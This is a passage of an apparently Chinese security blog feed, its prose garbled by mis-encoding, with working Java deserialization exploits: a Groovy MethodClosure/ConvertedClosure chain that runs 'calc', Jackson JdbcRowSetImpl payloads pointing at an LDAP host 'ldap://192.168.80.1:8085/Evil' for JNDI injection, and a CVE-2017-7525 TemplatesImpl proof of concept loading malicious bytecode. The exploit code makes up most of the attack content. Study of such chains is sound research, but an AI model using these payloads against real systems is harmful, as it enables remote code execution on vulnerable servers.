data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203132817.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021203132817"></p><p>è¿›è€Œè§¦å‘ä»»æ„æ–¹æ³•æ‰§è¡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203219533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203219533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021203219533"></p><p>åŠ ä¸ŠConvertedClosureç»§æ‰¿äº†ConversionHandler</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203330538.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203330538.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021203330538"></p><p>è¿™æ˜¯ä¸ªå…¸å‹çš„åŠ¨æ€ä»£ç†ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203351155.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203351155.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021203351155"></p><p>invokeæ–¹æ³•é‡Œè°ƒç”¨äº†invokeCustom</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203441854.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203441854.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021203441854"></p><p>ConversionClosureéšä¾¿ä»£ç†ä¸€ä¸ªç±»ï¼Œç”±äºcallæ— å‚ï¼Œåªè¦ç±»æœ‰æ— å‚æ–¹æ³•å³å¯ã€‚</p><p>æœ€å¥½æ˜¯readObjectæœ‰æ— å‚æ–¹æ³•çš„ï¼Œè¿™æ ·å°±èƒ½ä¸€æ­¥åˆ°ä½é“¾èµ·æ¥ã€‚é‚£å°±ä»£ç†Mapå§ï¼Œç„¶åç”¨AnnotationInvocationHandler.readObjectå»è°ƒç”¨Map.entrySet</p><p>æ³¨æ„è¿™é‡ŒAnnotationInvocationHandlerå¹¶æ²¡æœ‰èµ·åˆ°ä¸€ä¸ªä»£ç†çš„ä½œç”¨</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConversionHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        <span class="type">ConvertedClosure</span> <span class="variable">closure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(mc);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyConvertedClosure</span> <span class="operator">=</span> Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,closure);<span class="comment">//ConversionClosureä»£ç†Map</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annoconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annoconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">annotationInvocationHandlerInstance</span> <span class="operator">=</span> annoconstructor.newInstance(Target.class,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">memberValuesField</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredField(<span class="string">&quot;memberValues&quot;</span>);</span><br><span class="line">        memberValuesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        memberValuesField.set(annotationInvocationHandlerInstance,proxyConvertedClosure);</span><br><span class="line">        serialize(annotationInvocationHandlerInstance);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‚ä¸ªè¡¨</p><table><thead><tr><th>å…³é”®ç±»</th><th>å…³é”®å‡½æ•°</th></tr></thead><tbody><tr><td>MethodClosure</td><td>call</td></tr><tr><td>groovy.lang.GroovyShell</td><td>evaluate</td></tr><tr><td>groovy.util.GroovyScriptEngine</td><td>run</td></tr><tr><td>GroovyScriptEvaluator</td><td>evaluate</td></tr><tr><td>groovy.lang.GroovyClassLoader</td><td>parseClass</td></tr><tr><td>javax.script.ScriptEngine</td><td>eval</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Groovy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jackson ååºåˆ—åŒ–åˆé›†</title>
      <link href="/2024/10/15/jackson-lian/"/>
      <url>/2024/10/15/jackson-lian/</url>
      
        <content type="html"><![CDATA[<p>æƒ³ä¸åˆ°2017çš„é“¾å­æˆ‘è¿˜åœ¨å¤ç°</p><h3 id="ååºåˆ—åŒ–æ¡ä»¶"><a href="#ååºåˆ—åŒ–æ¡ä»¶" class="headerlink" title="ååºåˆ—åŒ–æ¡ä»¶"></a>ååºåˆ—åŒ–æ¡ä»¶</h3><p>è¾¾åˆ°ä»¥ä¸‹ä»»æ„ä¸€ä¸ªæ¡ä»¶ï¼Œå¯ä»¥ååºåˆ—åŒ–æŒ‡å®šç±»ï¼š</p><ul><li>å¼€å¯äº†enableDefaultTyping()å››ä¸ªçš„ä»»æ„ä¸€ä¸ªè®¾ç½®ï¼Œä¸è¿‡ä¸åŒè®¾ç½®èƒ½ååºåˆ—åŒ–çš„èŒƒå›´ä¸åŒï¼Œtrickä¹Ÿä¸åŒï¼ˆä¸è¿‡èŒƒå›´æœ€å°çš„JAVA_LANG_OBJECTéƒ½å¤Ÿç”¨ï¼‰</li><li>ä½¿ç”¨äº†@JsonTypeInfoæ³¨è§£å­—æ®µï¼Œæ³¨è§£å€¼ä¸º<code>JsonTypeInfo.Id.CLASS</code>æˆ–è€…<code>JsonTypeInfo. Id. MINIMAL_CLASS</code></li></ul><h3 id="ååºåˆ—åŒ–jsonæ ¼å¼"><a href="#ååºåˆ—åŒ–jsonæ ¼å¼" class="headerlink" title="ååºåˆ—åŒ–jsonæ ¼å¼"></a>ååºåˆ—åŒ–jsonæ ¼å¼</h3><p>å½“ç„¶ï¼Œä½ ä¹Ÿèƒ½è§‚å¯Ÿåˆ°ä¸åŒçš„æŒ‡å®šæ–¹å¼ï¼Œjsonçš„æ ¼å¼ä¸åŒã€‚æ¯”å¦‚enableDefaultTyping()è®¾ç½®ååºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰<code>@</code>ç¬¦å·ï¼Œè€Œæ˜¯ç”¨<code>[]</code>åŒ…è£¹äº†</p><ul><li>enableDefaultTypingå¯¹åº”jsonæ ¼å¼ï¼š</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.mi1k7ea.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p><code>[]</code>å¤¹ä½çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ç±»åï¼Œåé¢å¦‚æœç›´æ¥åŠ å­—ç¬¦ä¸²ï¼Œæ˜¯è°ƒç”¨æ„é€ æ„é€ å‡½æ•°ï¼ˆä¸åŠ æ˜¯è°ƒæ— å‚æ„é€ å‡½æ•°ï¼‰ï¼ŒåŠ <code>&#123;&#125;</code>æ˜¯è°ƒç”¨setterèµ‹å€¼</p><ul><li><code>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</code></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><code>@JsonTypeInfo(use = JsonTypeInfo. Id. MINIMAL_CLASS)</code></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@c&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–å…¥å£"><a href="#ååºåˆ—åŒ–å…¥å£" class="headerlink" title="ååºåˆ—åŒ–å…¥å£"></a>ååºåˆ—åŒ–å…¥å£</h3><p>ååºåˆ—åŒ–çš„å…¥å£ä¸ºä»¥ä¸‹ä¸¤ä¸ªçš„ä¸€ç§ï¼š</p><ul><li>JsonFactory.createParser</li><li>objectMapper.readValue</li></ul><p>jacksonæ¼æ´ç‰ˆæœ¬å¯ä»¥è§¦å‘ä»»æ„å‡½æ•°çš„æ„é€ å‡½æ•°å’Œsetterï¼Œä»¥æ­¤è¡ç”Ÿå‡ºæ”»å‡»é¢</p><p>JdbcRowSetImplè‚¯å®šèƒ½ç”¨</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><h3 id="Id-Classç‰ˆ"><a href="#Id-Classç‰ˆ" class="headerlink" title="Id_Classç‰ˆ"></a>Id_Classç‰ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Id_Class_Test</span> &#123;</span><br><span class="line">        <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line">        <span class="keyword">public</span> Object object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:&#123;&#x27;@class&#x27;:&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;dataSourceName&#x27;:&#x27;ldap://192.168.80.1:8085/Evil&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;autoCommit&#x27;:0,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JdbcRowSetImpl.<span class="type">Id_Class_Test</span> <span class="variable">test</span> <span class="operator">=</span> mapper.readValue(jsonInput, JdbcRowSetImpl.Id_Class_Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="enableDefaultTypingç‰ˆ"><a href="#enableDefaultTypingç‰ˆ" class="headerlink" title="enableDefaultTypingç‰ˆ"></a>enableDefaultTypingç‰ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">enableDefaultTyping_Test</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Object object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;dataSourceName&#x27;:&#x27;ldap://192.168.80.1:8085/Evil&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;autoCommit&#x27;:0,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JdbcRowSetImpl.<span class="type">enableDefaultTyping_Test</span> <span class="variable">test</span> <span class="operator">=</span> mapper.readValue(jsonInput, JdbcRowSetImpl.enableDefaultTyping_Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2017-7525-TemplatesImplé“¾"><a href="#CVE-2017-7525-TemplatesImplé“¾" class="headerlink" title="CVE-2017-7525 TemplatesImplé“¾"></a>CVE-2017-7525 TemplatesImplé“¾</h2><p>å’Œfastjsonä¸åŒçš„æ˜¯ï¼Œfastjsonæ˜¯ç›´æ¥æŒ‡å®šä¼ å…¥çš„ç±»ï¼Œè€Œjacksonï¼Œæ˜¯æŒ‡å®šObjectå­—æ®µä¸ºæ¶æ„ç±»</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>Jackson 2.6ç³»åˆ— &lt; 2.6.7.1</p><p>Jackson 2.7ç³»åˆ— &lt; 2.7.9.1</p><p>Jackson 2.8ç³»åˆ— &lt; 2.8.8.1</p><p>jdk&lt;&#x3D;7u21||8u20</p><p>pom.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="enableDefaultTyping-POC"><a href="#enableDefaultTyping-POC" class="headerlink" title="enableDefaultTyping POC"></a>enableDefaultTyping POC</h3><p>Testç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;test&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Test test;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test = mapper.readValue(jsonInput, Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(code1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ€ä¹ˆè°ƒç”¨çš„getterï¼Ÿä¸ºä»€ä¹ˆæˆ‘çš„caseè°ƒç”¨ä¸äº†ï¼Ÿå¦ˆçš„ï¼Œåˆ†æäº†ä¸¤å¤©ï¼Œä¸çŸ¥é“å“ªç§æƒ…å†µä¼šè°ƒç”¨åˆ°FieldProperty.deserializeAndSet ï¼Œå“ªç§æƒ…å†µä¼šè°ƒç”¨åˆ°setterlessProperty.deserializeAndSetã€‚ä¸ç®¡äº†ï¼Œåæ­£æ˜¯æŠ„pocã€‚ä»–å¦ˆæˆ‘å†™çš„caseä¹Ÿæ²¡æœ‰setterï¼Œå°±æ˜¯è¦è·‘åˆ°FieldProperty.deserializeAndSetå†…åå°„èµ‹å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013105457440.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013105457440.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸ç®¡äº†ï¼Œè§ç‰ˆæœ¬ç›´æ¥æ‰“</p><p>å¦‚æœæœ‰çŸ¥é“åŸå› çš„ï¼ŒQQ+1958304602 è§£ç­”V9.9å–èœœé›ªå†°åŸ</p></blockquote><p>å…¶ä»–çš„å°±æ˜¯è°ƒsetterèµ‹å€¼äº†ï¼Œæ³¨æ„jacksonèƒ½è°ƒç”¨ç§æœ‰çš„setter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111602440.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111602440.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111700984.png" class="lazyload placeholder" 